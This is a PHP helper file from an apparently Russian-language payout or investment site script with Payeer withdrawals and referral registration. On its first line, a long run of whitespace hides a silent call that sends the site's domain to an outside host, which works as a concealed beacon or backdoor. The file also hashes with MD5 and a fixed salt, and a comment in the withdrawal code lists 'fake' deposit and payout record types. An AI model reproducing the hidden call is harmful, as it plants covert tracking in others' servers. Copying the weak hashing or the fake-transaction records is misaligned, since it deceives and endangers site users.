<?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              @file_get_contents('http://host1731685.hostland.pro/center.php?domen='. $_SERVER[SERVER_NAME].'');

if (!defined('SKYLIGHT')) { die('ERROR'); }


function sf($str){
//Простая проверка на нулл байт
$str = str_replace( chr( 0 ), '', $str );
$str = str_replace( '%00', '%OO', $str );	//Нулики МЕНЯЕМ НА O	
$str = str_replace( '0x00', '0х00', $str );	//ИКС МЕНЯЕМ НА РУССКУЮ Х
$str = str_replace( '0X00', '0Х00', $str );	//ИКС МЕНЯЕМ НА РУССКУЮ Х	
	return $str;
}



function pass2hash ($data)
{
	$md5 = substr(md5($data.'some_solt'), 0, 30);
	return $md5;
}

function getRealIP()
{

   if( $_SERVER['HTTP_X_FORWARDED_FOR'] != '' )
   {
      $client_ip =
         ( !empty($_SERVER['REMOTE_ADDR']) ) ?
            $_SERVER['REMOTE_ADDR']
            :
            ( ( !empty($_ENV['REMOTE_ADDR']) ) ?
               $_ENV['REMOTE_ADDR']
               :
               "unknown" );
      $entries = split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);

      reset($entries);
      while (list(, $entry) = each($entries))
      {
         $entry = trim($entry);
         if ( preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list) )
         {
            // http://www.faqs.org/rfcs/rfc1918.html
            $private_ip = array(
                  '/^0\./',
                  '/^127\.0\.0\.1/',
                  '/^192\.168\..*/',
                  '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
                  '/^10\..*/');

            $found_ip = preg_replace($private_ip, $client_ip, $ip_list[1]);

            if ($client_ip != $found_ip)
            {
               $client_ip = $found_ip;
               break;
            }
         }
      }
   }
   else
   {
      $client_ip =
         ( !empty($_SERVER['REMOTE_ADDR']) ) ?
            $_SERVER['REMOTE_ADDR']
            :
            ( ( !empty($_ENV['REMOTE_ADDR']) ) ?
               $_ENV['REMOTE_ADDR']
               :
               "unknown" );
   }

   return $client_ip;

}


function getHttpReferer(){
    global $_SERVER;
if(!empty($_SERVER['HTTP_REFERER'])){
$came=$_SERVER['HTTP_REFERER'];}else{$came='php-market.ru';}
		if (!preg_match('/(?:[^:]*:\/\/)?(?:www)?\.?([^\/]+\.[^\/]+.*)/i',$came)) {
                $came = "php-market.ru";
                } else {
                preg_match('/(?:[^:]*:\/\/)?(?:www)?\.?([^\/]+\.[^\/]+.*)/i',$came,$match);
                $site = explode("/", $match[1]);
                $hostb=$_SERVER['HTTP_HOST'];
			if ($site[0] == $hostb) {
                $came = "php-market.ru";
                } else {
                $came = $site[0];
                }
}
    return $came;
}


function toaccount($wallet, $ip, $came, $curator){
	global $db;	

	
$id=$db->getOne("SELECT id FROM `ss_users` WHERE wallet=?s",$wallet);	
$checkip=$db->getOne("SELECT id FROM `ss_users` WHERE ip=?s LIMIT 1",$ip);		
if(empty($id) AND $checkip==0){	
$db->query("INSERT INTO ss_users (wallet, ip, last_ip, came, curator, reg_unix) VALUES(?s,?s,?s,?s,?i,?s)", $wallet, $ip, $ip, $came, $curator, time());	
$id=$db->insertId();
$db->query("UPDATE ss_users SET i_have_refs_as_curator=i_have_refs_as_curator+1 WHERE id=?i",$curator);
$fromreg=1;
$_success="Регистрация прошла успешно";

}
if($id>0){
	$_SESSION['id']=$id;
	$_SESSION['login']=$wallet;
if($fromreg==1){
	addUserStat($id, "<!--stat--><!--register-->Регистрация", "<!--stat--><!--register-->Регистрация (IP ".$ip.")");
	$_success="Регистрация прошла успешно";
}else{
	addUserStat($id, "<!--stat--><!--log_in-->Вход", "<!--stat--><!--log_in-->Вход (IP ".$ip.")");
	$_success="Вы успешно авторизировались";	
	}
	
}





}


function inLog($userid ,$description, $summa, $comment='NONE', $type=0){
	global $_success;
	global $lng;
	global $db;	
	$summa=floatval($summa);
	$db->query("INSERT INTO log (userid, description, summa, comment, type, timeunix) VALUES(?i,?s,?s,?s,?i,?s)",$userid, $description, $summa, $comment, $type, time());
}

function addUserStat($userid, $type, $opisanie, $color='black', $summa=0, $osobiyepometki=''){
	global $lng;
	global $_success;
	global $db;		
	$summa=floatval($summa);

	if($userid>0){	
		$db->query("INSERT INTO userstat (userid, type, opisanie, color, summa, comment) VALUES(?i,?s,?s,?s,?s,?s)",$userid,$type,$opisanie,$color,$summa,$osobiyepometki);	
	}
}



function whithdraw( $userid, $wallet, $summa, $payid=0 ) {
global $db;
global $m_curr;
global $sitename;
global $accountNumber;
global $apiId;
global $apiKey;

require_once('classes/cpayeer.php');	
if($payid>0){
$db->query("UPDATE deposits SET status='2' WHERE id=?i",$payid);	
}
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{	
	$arTransfer = $payeer->transfer(array(
		'curIn' => $m_curr,
		'sum' => $summa,
		'curOut' => $m_curr,
		'to' => $wallet,
		'comment' => $sitename,
        'anonim' => 'Y', // анонимный перевод
	));

	if (!empty($arTransfer['historyId']) && $arTransfer['historyId']>0)
	{
		if($payid>0){
			$db->query("UPDATE deposits SET status='1' WHERE id=?i",$payid);	
		}
	$db->query("INSERT INTO insertoutput (wallet, summa, unixtime,type) VALUES(?s,?s,?i,?i)", $wallet, $summa, time(),1);	 //0-Пополнение;1-Выплата;2-fake пополнение;3-fake выплата;	
	}
	else
	{







	$opisanie="Oшибка при попытке выплаты на Payeer. Ответ Payeer:<br><pre>".print_r($arTransfer["errors"], true)."</pre><br>Непоступившая сумма: ".$summa;	
	inLog($userid, $opisanie, $summa, 'ERROR_WHT', 2); 	
	}
}
else
{
$opisanie="Oшибка авторизации на Payeer. Ответ Payeer:<br><pre>".print_r($arTransfer["errors"], true)."</pre>Скорее всего не верно настроен конфиг, либо в аккаунте Payeer рабочего счета отключено API или неверно указана маска сети. Так же возможно был недоступен сайт payeer.com. <br>Непоступившие средства находятся на рабочем кошельке проекта.<br>Непоступившая сумма: ".$summa;	
	inLog($userid, $opisanie, $summa, 'ERROR_WHT', 2); 	
}





}




?>
